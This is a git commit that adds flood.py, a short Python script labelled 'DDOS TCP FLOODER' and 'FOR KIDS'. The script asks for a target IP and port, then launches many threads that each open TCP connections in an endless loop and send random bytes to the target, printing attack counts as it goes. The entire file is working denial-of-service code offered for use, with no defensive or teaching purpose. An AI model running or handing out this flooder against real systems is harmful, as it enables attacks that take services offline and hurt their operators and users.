01b92224c3a0450c40aef7152647f495f188df97
DR4G0N5 <63049672+Malam-X@users.noreply.github.com>
2021-03-20 18:54:34 +0700

    TCP Flood

---
+++ flood.py
@@ -0,0 +1,34 @@
+# DDOS TCP FLOODER
+# FOR KIDS
+
+import socket
+import random
+import threading
+
+ip = str(input('[+] Target: '))
+port = int(input('[+] Port: '))
+pack = int(input('[+] Packet/s: '))
+thread = int(input('[+] Threads: '))
+
+
+def start():
+    hh = random._urandom(10)
+    xx = int(0)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(hh)
+            for i in range(pack):
+                s.send(hh)
+            xx += 1
+            print('Attacking '+ip+' | Sent: '+str(xx))
+        except:
+            s.close()
+            print('Done')
+
+for x in range(thread):
+    thred = threading.Thread(target=start)
+    thred.start()
+
+# DONE!
